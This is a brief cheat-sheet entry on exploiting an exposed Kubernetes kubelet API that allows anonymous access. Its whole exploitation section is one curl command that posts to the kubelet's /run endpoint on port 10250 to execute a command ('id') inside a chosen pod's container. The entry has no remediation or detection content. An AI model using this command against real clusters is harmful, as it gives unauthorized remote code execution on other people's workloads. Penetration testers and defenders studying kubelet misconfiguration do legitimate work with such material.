# Exposed Kubelet API

## Prerequisites:

Allowed anonymous authentication, and exposed.

### 1) Exploitation

    curl -sk -X POST "https://NODE_IP:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME" -d "cmd=id"
